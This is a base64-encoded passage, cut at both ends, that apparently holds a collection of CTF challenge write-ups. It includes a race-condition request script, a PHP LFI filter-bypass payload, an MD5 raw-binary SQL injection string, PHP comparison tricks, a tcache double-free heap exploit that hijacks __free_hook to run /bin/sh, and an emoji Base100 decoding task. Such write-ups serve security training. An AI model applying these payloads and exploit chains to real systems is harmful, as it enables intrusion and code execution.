pbXBvcnQgcmVxdWVzdHNcclxuXHJcbmRlZiByZWRlZW0oKTpcclxuICAgIHJldHVybiByZXF1ZXN0cy5wb3N0KFwiaHR0cDovL3RhcmdldC9hcGkvcmVkZWVtXCIsIGpzb249e1wiaXRlbVwiOiBcImZsYWdcIn0pXHJcblxyXG53aXRoIGNvbmN1cnJlbnQuZnV0dXJlcy5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MTApIGFzIGV4ZWN1dG9yOlxyXG4gICAgZnV0dXJlcyA9IFtleGVjdXRvci5zdWJtaXQocmVkZWVtKSBmb3IgXyBpbiByYW5nZSgxMCldXHJcbiAgICBmb3IgZiBpbiBjb25jdXJyZW50LmZ1dHVyZXMuYXNfY29tcGxldGVkKGZ1dHVyZXMpOlxyXG4gICAgICAgIHJlc3AgPSBmLnJlc3VsdCgpXHJcbiAgICAgICAgaWYgXCJmbGFnXCIgaW4gcmVzcC50ZXh0OlxyXG4gICAgICAgICAgICBwcmludChyZXNwLnRleHQpXHJcbiAgICAgICAgICAgIGJyZWFrXHJcblxcYFxcYFxcYFxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7Li4ufVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyB3ZWJfdGVzdF84ICg3NDcpIC0gUEhQIExGSSBGaWx0ZXIgQnlwYXNzXHJcblxyXG4qKlx1NTIwNlx1NTAzQyoqOiA1MDAgfCAqKlx1N0M3Qlx1NTc4QioqOiBXZWJcclxuXHJcbioqXHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGKio6IFBIUCBcdTY3MkNcdTU3MzBcdTY1ODdcdTRFRjZcdTUzMDVcdTU0MkJcdUZGMDhMRklcdUZGMDkrIFx1OEZDN1x1NkVFNFx1N0VENVx1OEZDN1x1MzAwMlxyXG5cclxuKipcdTUxNzNcdTk1MkVcdTZCNjVcdTlBQTQqKjpcclxuMS4gXHU1M0QxXHU3M0IwXHU2NTg3XHU0RUY2XHU1MzA1XHU1NDJCXHU1M0MyXHU2NTcwXHVGRjBDXHU0RjQ2IFxcYC9mbGFnXFxgIFx1OERFRlx1NUY4NFx1ODhBQlx1OEZDN1x1NkVFNFxyXG4yLiBcdTRGN0ZcdTc1MjhcdTcyNzlcdTZCOEFcdTVCNTdcdTdCMjZcdUZGMDhcXGAlMDlcXGAgVEFCXHVGRjA5XHU2MjUzXHU2NUFEXHU1QjUwXHU0RTMyXHU1MzM5XHU5MTREXHJcbjMuIFx1N0VENVx1OEZDN1x1OEZDN1x1NkVFNFx1OEJGQlx1NTNENiBmbGFnIFx1NjU4N1x1NEVGNlxyXG5cclxuKipQYXlsb2FkKio6XHJcblxcYFxcYFxcYFxyXG4/cGFnZT0vZmxhJTA5Z1xyXG5cXGBcXGBcXGBcclxuXHJcbioqXHU1MzlGXHU3NDA2Kio6IFdBRiBcdTRGN0ZcdTc1MjhcdTVCNTdcdTdCMjZcdTRFMzJcdTUzMzlcdTkxNERcdTY4QzBcdTZENEIgXFxgL2ZsYWdcXGBcdUZGMENcdTRGNDYgXFxgJTA5XFxgXHVGRjA4VEFCIFx1NUI1N1x1N0IyNlx1RkYwOVx1ODhBQiBQSFAgXHU1RjUzXHU0RjVDXHU3QTdBXHU3NjdEXHU3QjI2XHVGRjBDXHU2MjUzXHU2NUFEXHU0RTg2XHU4RkRFXHU3RUVEXHU1QjU3XHU3QjI2XHU0RTMyXHU1MzM5XHU5MTREXHUzMDAyXHJcblxyXG4qKkZsYWcqKjogXFxgZmxhZ3suLi59XFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIHdlYl90ZXN0XzkgKDc5MCkgLSBQSFAgXHU1M0NEXHU1RThGXHU1MjE3XHU1MzE2IE5VTEwgdnMgRkFMU0VcclxuXHJcbioqXHU1MjA2XHU1MDNDKio6IDQ1NCB8ICoqXHU3QzdCXHU1NzhCKio6IFdlYlxyXG5cclxuKipcdTg5RTNcdTk4OThcdTYwMURcdThERUYqKjogUEhQIFx1NUYzMVx1N0M3Qlx1NTc4Qlx1NkJENFx1OEY4M1x1NkYwRlx1NkQxRVx1MzAwMlxyXG5cclxuKipcdTUxNzNcdTk1MkVcdTZCNjVcdTlBQTQqKjpcclxuMS4gXHU1M0QxXHU3M0IwXHU1M0NEXHU1RThGXHU1MjE3XHU1MzE2XHU1MTY1XHU1M0UzXHVGRjBDXHU5NzAwXHU4OTgxXHU2Nzg0XHU5MDIwXHU3Mjc5XHU1QjlBXHU1QkY5XHU4QzYxXHJcbjIuIFx1NTIyOVx1NzUyOCBcXGBOVUxMICE9PSBGQUxTRVxcYCBcdTRGNDYgXFxgbWQ1KE5VTEwpID09PSBtZDUoRkFMU0UpXFxgIFx1NzY4NFx1NzI3OVx1NjAyN1xyXG4zLiBcdTY3ODRcdTkwMjAgcGF5bG9hZCBcdTdFRDVcdThGQzdcdTRFMjVcdTY4M0NcdTZCRDRcdThGODNcclxuXHJcbioqUGF5bG9hZCoqOlxyXG5cXGBcXGBcXGBwaHBcclxuJGEgPSBOVUxMO1xyXG4kYiA9IEZBTFNFO1xyXG4vLyAkYSAhPT0gJGIgXHU0RTNBIHRydWVcclxuLy8gbWQ1KCRhKSA9PT0gbWQ1KCRiKSBcdTRFM0EgdHJ1ZVx1RkYwOFx1OTBGRFx1NjYyRiBtZDUoXCJcIikgPSBcImQ0MWQ4Y2Q5OGYwMGIyMDRlOTgwMDk5OGVjZjg0MjdlXCJcdUZGMDlcclxuXFxgXFxgXFxgXHJcblxyXG4qKkZsYWcqKjogXFxgZmxhZ3suLi59XFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIHdlYl90ZXN0XzEwICg3OTEpIC0gUEhQIFx1NTNDRFx1NUU4Rlx1NTIxN1x1NTMxNiBOQU4gRmlsdGVyXHJcblxyXG4qKlx1NTIwNlx1NTAzQyoqOiA0NTQgfCAqKlx1N0M3Qlx1NTc4QioqOiBXZWJcclxuXHJcbioqXHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGKio6IFx1NTcyOCA3OTAgXHU1N0ZBXHU3ODQwXHU0RTBBXHU1ODlFXHU1MkEwIE5BTiBcdThGQzdcdTZFRTRcdTMwMDJcclxuXHJcbioqXHU1MTczXHU5NTJFXHU2QjY1XHU5QUE0Kio6XHJcbjEuIFx1NEUwRSA3OTAgXHU3QzdCXHU0RjNDXHU3Njg0XHU1M0NEXHU1RThGXHU1MjE3XHU1MzE2XHU2RjBGXHU2RDFFXHJcbjIuIFx1NTg5RVx1NTJBMFx1NEU4NiBcXGBzdHJpcG9zKCRpbnB1dCwgXCJOQU5cIilcXGAgXHU2OEMwXHU2N0U1XHJcbjMuIE5VTEwgXHU1NDhDIEZBTFNFIFx1OTBGRFx1NEUwRFx1NTQyQiBcIk5BTlwiIFx1NUI1N1x1N0IyNlx1NEUzMlx1RkYwQ1x1N0VENVx1OEZDN1x1NjhDMFx1NjdFNVxyXG5cclxuKipQYXlsb2FkKio6XHJcblxcYFxcYFxcYHBocFxyXG4kYSA9IE5VTEw7ICAvLyBcdTRFMERcdTU0MkIgXCJOQU5cIlxyXG4kYiA9IEZBTFNFOyAvLyBcdTRFMERcdTU0MkIgXCJOQU5cIlxyXG5cXGBcXGBcXGBcclxuXHJcbioqRmxhZyoqOiBcXGBmbGFney4uLn1cXGBcclxuXHJcbi0tLVxyXG5cclxuIyMgd2ViX3Rlc3RfMTEgKDc5MikgLSBNRDUgUmF3IEJpbmFyeSBTUUwgSW5qZWN0aW9uXHJcblxyXG4qKlx1NTIwNlx1NTAzQyoqOiA0NTQgfCAqKlx1N0M3Qlx1NTc4QioqOiBXZWJcclxuXHJcbioqXHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGKio6IFx1NTIyOVx1NzUyOCBNRDUgXHU1MzlGXHU1OUNCXHU0RThDXHU4RkRCXHU1MjM2XHU4RjkzXHU1MUZBXHU4RkRCXHU4ODRDIFNRTCBcdTZDRThcdTUxNjVcdTMwMDJcclxuXHJcbioqXHU1MTczXHU5NTJFXHU2QjY1XHU5QUE0Kio6XHJcbjEuIFx1NTNEMVx1NzNCMFx1NzY3Qlx1NUY1NVx1NjNBNVx1NTNFM1x1NEY3Rlx1NzUyOCBcXGBtZDUoJHBhc3N3b3JkLCB0cnVlKVxcYCBcdThGREJcdTg4NENcdTZCRDRcdThGODNcclxuMi4gXHU1QkM2XHU3ODAxIFwiZmZpZmR5b3BcIiBcdTc2ODQgTUQ1IFx1NTM5Rlx1NTlDQlx1NEU4Q1x1OEZEQlx1NTIzNlx1NTMwNVx1NTQyQiBcXGAnb3InXFxgIFx1NUI1N1x1N0IyNlx1NEUzMlxyXG4zLiBcdTZDRThcdTUxNjVcdTU0MEUgU1FMIFx1OEJFRFx1NTNFNVx1NTNEOFx1NEUzQSBcXGBXSEVSRSBwYXNzd29yZCA9ICcnb3InLi4uJ1xcYFx1RkYwQ1x1N0VENVx1OEZDN1x1OUE4Q1x1OEJDMVxyXG5cclxuKipQYXlsb2FkKio6XHJcblxcYFxcYFxcYFxyXG5wYXNzd29yZCA9IGZmaWZkeW9wXHJcblxcYFxcYFxcYFxyXG5cclxuKipcdTUzOUZcdTc0MDYqKjogXFxgbWQ1KFwiZmZpZmR5b3BcIiwgdHJ1ZSlcXGAgXHU4RkQ0XHU1NkRFXHU3Njg0XHU1MzlGXHU1OUNCXHU0RThDXHU4RkRCXHU1MjM2XHU0RTJEXHU1MzA1XHU1NDJCIFxcYCdvcic2XFxgXHVGRjBDXHU2MkZDXHU2M0E1XHU1NDBFIFNRTCBcdTUzRDhcdTRFM0FcdUZGMUFcclxuXFxgXFxgXFxgc3FsXHJcblNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgcGFzc3dvcmQgPSAnJ29yJzYuLi4uJ1xyXG5cXGBcXGBcXGBcclxuXHJcbioqRmxhZyoqOiBcXGBmbGFney4uLn1cXGBcclxuXHJcbi0tLVxyXG5cclxuIyMgXHU2MjgwXHU1REU3XHU2MDNCXHU3RUQzXHJcblxyXG4jIyMgMS4gXHU1M0NEXHU1RThGXHU1MjE3XHU1MzE2XHU2MjgwXHU1REU3XHJcbi0gXFxgTlVMTCAhPT0gRkFMU0VcXGAgXHU0RjQ2IFxcYG1kNShOVUxMKSA9PT0gbWQ1KEZBTFNFKVxcYFxyXG4tIFxcYG1kNSgkaW5wdXQsIHRydWUpXFxgIFx1OEZENFx1NTZERVx1NTM5Rlx1NTlDQlx1NEU4Q1x1OEZEQlx1NTIzNlx1RkYwQ1x1NTNFRlx1ODBGRFx1NTMwNVx1NTQyQiBTUUwgXHU2Q0U4XHU1MTY1XHU1QjU3XHU3QjI2XHU0RTMyXHJcbi0gXHU1QkM2XHU3ODAxIFwiZmZpZmR5b3BcIiBcdTY2MkZcdTdFQ0ZcdTUxNzhcdTc2ODQgTUQ1IHJhdyBiaW5hcnkgU1FMaSBwYXlsb2FkXHJcblxyXG4jIyMgMi4gXHU3QURFXHU2MDAxXHU2NzYxXHU0RUY2XHJcbi0gXHU0RjdGXHU3NTI4IFxcYGNvbmN1cnJlbnQuZnV0dXJlcy5UaHJlYWRQb29sRXhlY3V0b3JcXGAgXHU1RTc2XHU1M0QxXHU4QkY3XHU2QzQyXHJcbi0gXHU2OEMwXHU2N0U1XHU0RTBFXHU2NENEXHU0RjVDXHU0RTRCXHU5NUY0XHU3Njg0XHU2NUY2XHU5NUY0XHU3QTk3XHU1M0UzXHU2NjJGXHU1MTczXHU5NTJFXHJcblxyXG4jIyMgMy4gTEZJIEZpbHRlciBCeXBhc3NcclxuLSBcXGAlMDlcXGBcdUZGMDhUQUJcdUZGMDlcdTMwMDFcXGAlMEFcXGBcdUZGMDhcdTYzNjJcdTg4NENcdUZGMDlcdTMwMDFcXGAlMERcXGBcdUZGMDhcdTU2REVcdThGNjZcdUZGMDlcdTUzRUZcdTYyNTNcdTY1QURcdTVCNTdcdTdCMjZcdTRFMzJcdTUzMzlcdTkxNERcclxuLSBcdTUzQ0NcdTdGMTZcdTc4MDFcdTMwMDFVbmljb2RlIFx1N0YxNlx1NzgwMVx1NEU1Rlx1NTNFRlx1ODBGRFx1N0VENVx1OEZDN1x1OEZDN1x1NkVFNFxyXG5cclxuIyMjIDQuIFx1NTNEOFx1OTFDRlx1ODk4Nlx1NzZENlxyXG4tIFxcYGV4dHJhY3QoKVxcYCBcdTUxRkRcdTY1NzBcdTUzRUZcdTg5ODZcdTc2RDZcdTVERjJcdTY3MDlcdTUzRDhcdTkxQ0ZcclxuLSBcXGAkJFxcYCBcdTUzRUZcdTUzRDhcdTUzRDhcdTkxQ0ZcdTUzRUZcdTUyQThcdTYwMDFcdTUyMUJcdTVFRkFcdTUzRDhcdTkxQ0ZcclxuXHJcbi0tLVxyXG5cclxuKldyaXRlVXAgXHU3NTFGXHU2MjEwXHU2NUY2XHU5NUY0OiAyMDI2LTA2LTE2KlxyXG4qXHU0RjVDXHU4MDA1OiBoZWxpdW1zZW5icmcqXHJcbmBcclxuICB9LFxyXG5cclxuICBnaWZ0OiB7XHJcbiAgICB0aXRsZTogJ0dpZnQgLSBUY2FjaGUgRG91YmxlLUZyZWUnLFxyXG4gICAgc3VidGl0bGU6ICdVQUYgKyBVbnNvcnRlZCBCaW4gTGVhayArIFRjYWNoZSBQb2lzb25pbmcnLFxyXG4gICAgY29udGVudDogYFxyXG4jIEdpZnQgLSBUY2FjaGUgRG91YmxlLUZyZWUgUFdOXHJcblxyXG4qKlBsYXRmb3JtKio6IHFpbmdjZW4gQ1RGIChkb2NrZXIucWluZ2Nlbi5uZXQpXHJcbioqVHlwZSoqOiBQV04gLyBIZWFwIEV4cGxvaXRhdGlvblxyXG4qKkRpZmZpY3VsdHkqKjogSGFyZCAoNDc2IHBvaW50cywgMiBzb2x2ZXJzKVxyXG5cclxuIyMgQmluYXJ5IFByb3RlY3Rpb25zXHJcblxyXG5cXGBcXGBcXGBcclxuUkVMUk86ICAgRnVsbCBSRUxST1xyXG5TdGFjazogICBDYW5hcnkgZm91bmRcclxuTlg6ICAgICAgTlggZW5hYmxlZFxyXG5QSUU6ICAgICBQSUUgZW5hYmxlZFxyXG5DRVQ6ICAgICBTSFNUSyArIElCVCBlbmFibGVkXHJcbkxpYmM6ICAgIGdsaWJjIDIuMzEgKFVidW50dSAyMC4wNClcclxuXFxgXFxgXFxgXHJcblxyXG5GdWxsIFJFTFJPIHByZXZlbnRzIEdPVCBvdmVyd3JpdGUuIENFVCAoU0hTVEsrSUJUKSBtYWtlcyBST1AgZGlmZmljdWx0LlxyXG5UaGUgYXR0YWNrIG11c3QgZ28gdGhyb3VnaCBsaWJjIGhvb2tzIGxpa2UgX19mcmVlX2hvb2suXHJcblxyXG4jIyBWdWxuZXJhYmlsaXR5OiBIaWRkZW4gR2lmdCBGdW5jdGlvblxyXG5cclxuVGhlIGJpbmFyeSBpcyBhIG5vdGUgbWFuYWdlciB3aXRoIDMgdmlzaWJsZSBvcHRpb25zOiBBZGQsIFNob3csIFJlbGVhc2UuXHJcbkEgaGlkZGVuIG9wdGlvbiA0IChcIkEgZ2lmdCBmb3IgeW91XCIpIGNhbGxzIGZyZWUoY2h1bmspIGJ1dCBkb2VzIE5PVCBudWxsIG91dCBwdHJzW2lkeF0gb3Igc2l6ZXNbaWR4XSwgY3JlYXRpbmcgYSBkYW5nbGluZyBwb2ludGVyIChVQUYpLlxyXG5cclxuTm9ybWFsIHJlbGVhc2UoKSBwcm9wZXJseSBudWxscyBib3RoIHB0cnNbaWR4XSBhbmQgc2l6ZXNbaWR4XS5cclxuXHJcblxcYFxcYFxcYGNcclxuLy8gR2lmdCBmdW5jdGlvbiAocHNldWRvLWNvZGUpXHJcbnZvaWQgZ2lmdCgpIHtcclxuICAgIGlmIChnaWZ0X3VzZWQpIHJldHVybjsgIC8vIG9uZS10aW1lIHVzZSFcclxuICAgIGdpZnRfdXNlZCA9IDE7XHJcbiAgICBpbnQgaWR4ID0gcmVhZF9pbmRleCgpO1xyXG4gICAgaWYgKHB0cnNbaWR4XSAhPSBOVUxMKVxyXG4gICAgICAgIGZyZWUocHRyc1tpZHhdKTsgIC8vIEJVRzogcHRyc1tpZHhdIE5PVCBjbGVhcmVkIVxyXG59XHJcblxcYFxcYFxcYFxyXG5cclxuIyMgS2V5IEluc2lnaHQ6IERvdWJsZS1GcmVlIHZpYSBnaWZ0ICsgcmVsZWFzZVxyXG5cclxuU2luY2UgZ2lmdCgpIGRvZXMgbm90IGNsZWFyIHB0cnNbaWR4XSwgY2FsbGluZyByZWxlYXNlKCkgb24gdGhlIHNhbWUgaW5kZXggYWZ0ZXJ3YXJkIHRyaWdnZXJzIGZyZWUoKSBvbiB0aGUgYWxyZWFkeS1mcmVlZCBjaHVuazpcclxuXHJcbjEuIGdpZnQoaWR4KTogZnJlZShBKSwgcHRyc1tpZHhdIHN0aWxsID0gQSAoZGFuZ2xpbmcpXHJcbjIuIHJlbGVhc2UoaWR4KTogZnJlZShwdHJzW2lkeF0pID0gZnJlZShBKSBhZ2FpbiEgLT4gRE9VQkxFIEZSRUVcclxuXHJcbmdsaWJjIDIuMzEgdGNhY2hlIGhhcyBubyBkb3VibGUtZnJlZSBkZXRlY3Rpb24sIGNyZWF0aW5nIGEgY3ljbGU6IEEgLT4gQSAtPiBBIC0+IC4uLlxyXG5cclxuIyMgRXhwbG9pdGF0aW9uIFN0cmF0ZWd5XHJcblxyXG4jIyMgUGhhc2UgMTogTGliYyBMZWFrIHZpYSBVbnNvcnRlZCBCaW5cclxuXHJcbkZpbGwgdGNhY2hlICg3IGVudHJpZXMpLCB0aGVuIGdpZnQoMCkgcHVzaGVzIGNodW5rIHRvIHVuc29ydGVkIGJpbi5cclxuc2hvdygwKSByZWFkcyB0aGUgZnJlZWQgY2h1bmsgZmQgcG9pbnRlciA9ICZtYWluX2FyZW5hKzEwNCAobGliYyBhZGRyZXNzKS5cclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG4jIEZpbGwgdGNhY2hlIGJpbiAxNiAoc2l6ZSAweDExMCkgd2l0aCA3IGVudHJpZXNcclxuZm9yIGkgaW4gcmFuZ2UoOCwgMSwgLTEpOlxyXG4gICAgcmVsZWFzZShpKSAgIyA3IGZyZWVzIC0+IHRjYWNoZSBmdWxsXHJcblxyXG4jIGdpZnQoMCk6IHRjYWNoZSBmdWxsIC0+IGNodW5rIGdvZXMgdG8gdW5zb3J0ZWQgYmluXHJcbmdpZnQoMClcclxuXHJcbiMgTGVhayBsaWJjIGZyb20gdW5zb3J0ZWQgYmluIGZkIHBvaW50ZXJcclxubGVhayA9IHU2NChzaG93KDApWzo4XSlcclxubGliY19iYXNlID0gbGVhayAtIChtYWxsb2NfaG9vayArIDB4NzgpXHJcblxcYFxcYFxcYFxyXG5cclxuIyMjIFBoYXNlIDI6IERvdWJsZS1GcmVlIC0+IFRjYWNoZSBDeWNsZVxyXG5cclxuXFxgXFxgXFxgcHl0aG9uXHJcbiMgcmVsZWFzZSgwKSBmcmVlcyB0aGUgc2FtZSBjaHVuayBhZ2FpbiAtPiBkb3VibGUtZnJlZSFcclxucmVsZWFzZSgwKVxyXG4jIHRjYWNoZSBjeWNsZTogQSAtPiBBIC0+IEEgLT4gLi4uXHJcblxcYFxcYFxcYFxyXG5cclxuIyMjIFBoYXNlIDM6IFRjYWNoZSBQb2lzb25pbmcgLT4gX19mcmVlX2hvb2tcclxuXHJcblRocmVlIGFsbG9jYXRpb25zIGZyb20gdGhlIGN5Y2xlZCB0Y2FjaGU6XHJcblxyXG5cXGBcXGBcXGBweXRob25cclxuIyBBbGxvYyAjMTogZ2V0IEEsIHdyaXRlIF9fZnJlZV9ob29rIGFzIGZkXHJcbmFkZCgyLCAweGY4LCBwNjQoZnJlZV9ob29rKSlcclxuXHJcbiMgQWxsb2MgIzI6IGdldCBBIGFnYWluIChjeWNsZSksIHRjYWNoZSByZWFkcyAqQSA9IGZyZWVfaG9vayBhcyBuZXh0XHJcbmFkZCgzLCAweGY4LCBwNjQoc3lzdGVtKSlcclxuXHJcbiMgQWxsb2MgIzM6IGdldCBfX2ZyZWVfaG9vayEgV3JpdGUgc3lzdGVtXHJcbmFkZCg0LCAweGY4LCBwNjQoc3lzdGVtKSlcclxuXFxgXFxgXFxgXHJcblxyXG4jIyMgUGhhc2UgNDogVHJpZ2dlciBTaGVsbFxyXG5cclxuXFxgXFxgXFxgcHl0aG9uXHJcbmFkZCg1LCAweGY4LCBiJy9iaW4vc2hcXFxceDAwJylcclxucmVsZWFzZSg1KSAgIyBmcmVlKGNodW5rKSAtPiBfX2ZyZWVfaG9vayAtPiBzeXN0ZW0oXCIvYmluL3NoXCIpXHJcblxcYFxcYFxcYFxyXG5cclxuIyMgS2V5IFRha2Vhd2F5c1xyXG5cclxuMS4gZ2lmdCgpICsgcmVsZWFzZSgpID0gZG91YmxlLWZyZWUsIGV2ZW4gd2l0aCBvbmUtdGltZSBnaWZ0XHJcbjIuIFVuc29ydGVkIGJpbiBmZCBiZXR3ZWVuIGdpZnQgYW5kIHJlbGVhc2UgbGVha3MgbGliYyBjbGVhbmx5XHJcbjMuIFRjYWNoZSBjeWNsZSBBLT5BIGxldHMgeW91IGFsbG9jYXRlIHRoZSBzYW1lIGNodW5rIG11bHRpcGxlIHRpbWVzXHJcbjQuIF9fZnJlZV9ob29rIGlzIHRoZSBnby10byB0YXJnZXQgd2hlbiBGdWxsIFJFTFJPICsgQ0VUIGFyZSBlbmFibGVkXHJcbmBcclxuICB9LFxyXG5cclxuICAnbW9lY3RmLWVtb2ppJzoge1xyXG4gICAgdGl0bGU6ICdNb2VDVEYgZXpfYmFzZV9yZXZlbmdlOSBcdTIwMTQgRW1vamkgXHU3RjE2XHU3ODAxJyxcclxuICAgIHN1YnRpdGxlOiAnQmFzZTEwMCBcdTIxOTIgQmFzZTY0IFx1MjE5MiBCYXNlNTggXHUyMTkyIEJhc2UzMicsXHJcbiAgICBjb250ZW50OiBgXHJcbiMgTW9lQ1RGIGV6X2Jhc2VfcmV2ZW5nZTkgXHUyMDE0IEVtb2ppIFx1N0YxNlx1NzgwMSAoQmFzZTEwMClcclxuXHJcbioqUGxhdGZvcm0qKjogTW9lQ1RGXHJcbioqVHlwZSoqOiBNaXNjIC8gRW5jb2RpbmdcclxuKipEaWZmaWN1bHR5Kio6IEVhc3lcclxuKipGbGFnKio6IFxcYG1vZWN0ZnszbTBqIV8xNV81MF9jdTczXzIzMzMzMzN9XFxgXHJcblxyXG4jIyBcdTk4OThcdTc2RUVcclxuXHJcblx1OTY0NFx1NEVGNlx1ODlFM1x1NTM4Qlx1NTFGQSBcXGBmbGFnOS50eHRcXGBcdUZGMENcdTkxQ0NcdTk3NjJcdTRFMDBcdTRFMkFcdTZCNjNcdTdFQ0ZcdTVCNTdcdTkwRkRcdTZDQTFcdTY3MDlcdUZGMENcdTUzRUFcdTY3MDkgMTA0IFx1NEUyQSBlbW9qaVx1RkYxQVxyXG5cclxuXFxgXFxgXFxgdGV4dFxyXG5cdUQ4M0RcdURDMkRcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMjdcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMkRcdUQ4M0RcdURDMkRcdUQ4M0RcdURDMDFcdUQ4M0RcdURDMkRcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMDFcdUQ4M0RcdURDMkRcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMDFcdUQ4M0RcdURDMDFcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMkRcdUQ4M0RcdURDMDFcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMkRcdUQ4M0RcdURDMkRcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMjdcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMDFcdUQ4M0RcdURDMkRcdUQ4M0RcdURDMjhcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMjdcdUQ4M0RcdURDMjhcdUQ4M0RcdURDMkRcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMjdcdUQ4M0RcdURDMjhcdUQ4M0RcdURDMkRcdUQ4M0RcdURDMjlcdUQ4M0RcdURDMjhcdUQ4M0RcdURDMjdcdUQ4M0RcdURDMkRcdUQ4M0RcdURDMjkuLi5cclxuXFxgXFxgXFxgXHJcblxyXG40MTYgXHU1QjU3XHU4MjgyXHVGRjBDXHU2NUUwXHU2MzYyXHU4ODRDXHUzMDAyXHJcblxyXG4jIyBcdTk4OThcdTc2RUVcdTUyMDZcdTY3OTBcclxuXHJcblx1NTE0OFx1NTIyQlx1NjAyNVx1Nzc0MFx1NzMxQ1x1N0YxNlx1NzgwMVx1RkYwQ1x1NjI4QVx1NUI1N1x1ODI4Mlx1NjI1Mlx1NUYwMFx1NzcwQlx1RkYxQVxyXG5cclxuLSA0MTYgLyA0ID0gMTA0IFx1NEUyQVx1NUI1N1x1N0IyNlx1RkYwQ1x1NTE2OFx1NjYyRiA0IFx1NUI1N1x1ODI4MiBVVEYtOFxyXG4tIFx1OTk5Nlx1NUI1N1x1ODI4Mlx1NjA1Mlx1NEUzQSBcXGBGMFxcYFx1RkYwQ1x1NkIyMVx1NUI1N1x1ODI4Mlx1NjA1Mlx1NEUzQSBcXGA5RlxcYFxyXG4tIFx1N0IyQ1x1NEUwOVx1NUI1N1x1ODI4Mlx1NTNFQVx1NTcyOCBcXGA5MFxcYCAvIFxcYDkxXFxgIFx1NEU0Qlx1OTVGNFx1OERGM1xyXG4tIFx1NzgwMVx1NzBCOVx1NTE2OFx1OTBFOFx1ODQzRFx1NTcyOCBcXGBVKzFGNDAwIFx1MjAxMyBVKzFGNDdGXFxgXHVGRjBDXHU2QjYzXHU1OTdEIDEyOCBcdTRFMkFcdTUzRUZcdTkwMDlcdTUwM0NcclxuXHJcblx1OEZEOVx1NUMzMVx1NjYyRiAqKkJhc2UxMDAqKlx1RkYwOEVtb2ppIEVuY29kaW5nXHVGRjA5XHUzMDAyXHU1QjgzXHU3Njg0XHU4OUM0XHU1MjE5XHU0RTBEXHU2NjJGXHUzMDBDXHU3ODAxXHU3MEI5XHU1MUNGXHU1MDRGXHU3OUZCXHUzMDBEXHVGRjBDXHU4MDBDXHU2NjJGXHU2MjhBIDEgXHU0RTJBXHU1QjU3XHU4MjgyXHU2MkM2XHU2MjEwIDYgKyA2IFx1NEY0RFx1RkYwQ1x1NTg1RVx1OEZEQiBVVEYtOCBcdTc2ODRcdTY3MDBcdTU0MEVcdTRFMjRcdTRFMkFcdTVCNTdcdTgyODJcdUZGMUFcclxuXHJcblxcYFxcYFxcYHRleHRcclxuVVRGLTg6ICBGMCA5RiBiMyBiNFxyXG4gICAgICAgIGIzID0gKGJ5dGUgKyA1NSkgLyA2NCArIDE0M1xyXG4gICAgICAgIGI0ID0gKGJ5dGUgKyA1NSkgJSA2NCArIDEyOFxyXG5cXGBcXGBcXGBcclxuXHJcblx1NjI0MFx1NEVFNVx1ODlFM1x1NzgwMVx1RkYxQVxyXG5cclxuXFxgXFxgXFxgcHl0aG9uXHJcbmJ5dGUgPSAoYjMgLSAxNDMpICogNjQgKyAoYjQgLSAxMjgpIC0gNTVcclxuXFxgXFxgXFxgXHJcblxyXG4jIyMgXHU2NzAwXHU1OTI3XHU3Njg0XHU1NzUxXHJcblxyXG5cdTYyMTFcdTdCMkNcdTRFMDBcdTUzQ0RcdTVFOTRcdTY2MkZcdTYzMDlcdTc4MDFcdTcwQjlcdTdCOTcgXFxgY29kZXBvaW50IC0gMHgxRjQwMFxcYFx1RkYwQ1x1N0VEM1x1Njc5Q1x1NjJGRlx1NTIzMFx1NEUwMFx1NEUzMlx1ODMwM1x1NTZGNCA0MFx1MjAxMzExMyBcdTc2ODRcdTRFNzFcdTc4MDFcdUZGMENcdTk1N0ZcdTVGOTdcdTcyNzlcdTUyMkJcdTUwQ0YgYmFzZTg1IC8gYmFzZTkxIC8gYmFzZTkyXHVGRjBDXHU3MTM2XHU1NDBFXHU1QzMxXHU1NzI4XHU5NTE5XHU4QkVGXHU3Njg0XHU2NUI5XHU1NDExXHU0RTBBXHU0RTAwXHU4REVGXHU3MkMyXHU1OTU0IFx1MjAxNFx1MjAxNCBiOTJcdTMwMDFiOTRcdTMwMDFiMTI4IFx1NTE2OFx1OEJENVx1NEU4Nlx1NEUwMFx1OTA0RFx1RkYwQ1x1NTE2OFx1NjYyRlx1NTY2QVx1NThGMFx1MzAwMlxyXG5cclxuKipcdTZCNjNcdTc4NkVcdTUwNEZcdTc5RkJcdTY2MkYgKzlcdUZGMENcdTgwMENcdTRFMTRcdTVGQzVcdTk4N0JcdThENzBcdTMwMEM2ICsgNiBcdTRGNERcdTYyRkNcdTYzQTVcdTMwMERcdThGRDlcdTY3NjFcdThERUZcdTMwMDIqKiBcdTc3MEJcdTUyMzAgZW1vamkgXHU1MTQ4IGhleGR1bXBcdUZGMENcdTZCRDRcdTgwODlcdTc3M0NcdTczMUNcdTk3NjBcdThDMzFcdTVGOTdcdTU5MUFcdTMwMDJcclxuXHJcbiMjIFx1ODlFM1x1OTg5OFx1NkI2NVx1OUFBNFxyXG5cclxuIyMjIFN0ZXAgMSBcdTIwMTQgQmFzZTEwMCBcdTg5RTNcdTc4MDFcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG5kZWYgYjEwMF9kZWNvZGUocyk6XHJcbiAgICBvdXQgPSBieXRlYXJyYXkoKVxyXG4gICAgZm9yIGNoIGluIHM6XHJcbiAgICAgICAgYiA9IGNoLmVuY29kZSgndXRmLTgnKVxyXG4gICAgICAgIG91dC5hcHBlbmQoKGJbMl0gLSAxNDMpICogNjQgKyAoYlszXSAtIDEyOCkgLSA1NSlcclxuICAgIHJldHVybiBieXRlcyhvdX